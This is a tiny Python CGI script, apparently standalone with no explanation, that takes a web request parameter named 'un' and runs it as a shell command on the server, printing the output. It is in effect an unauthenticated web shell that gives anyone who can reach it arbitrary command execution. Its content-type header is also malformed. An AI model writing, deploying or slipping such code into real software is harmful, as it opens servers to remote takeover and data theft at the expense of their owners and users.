#!/usr/bin/python3
import subprocess
import cgi

print("Content-type: html/text")
print()

cmd=cgi.FieldStorage()
mycmd=cmd.getvalue('un')
output=subprocess.getoutput(mycmd)
print(output)
